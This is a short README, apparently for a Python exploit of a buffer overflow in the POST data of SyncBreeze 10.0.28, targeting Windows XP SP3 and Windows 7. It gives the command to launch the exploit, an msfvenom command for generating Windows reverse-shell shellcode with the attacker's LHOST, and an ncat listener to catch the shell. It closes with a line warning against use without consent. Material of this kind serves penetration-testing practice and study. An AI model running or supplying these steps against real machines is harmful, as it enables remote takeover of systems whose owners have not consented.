# SyncBreeze 10.0.28 Buffer OverFlow for Remote Code Execution
POST data buffer overflow
## How it works?
That easy BoF, rewritten by me, will overwrite the buffer and execute the shellcode
## Vuln machines:
WindowsXP SP3 and Windows7
## Launch:
````~$ python3 SyncBreeze.py <host> <port>````
## Change the ShellCode with your own!!
````~$ sudo ./msfvenom windows/shell_reverse_tcp LHOST=<your ip> LPORT=4444````
## Listen with netcat:
````~$ ncat -lvp 4444````
### Don't pwn any machine without consent!!
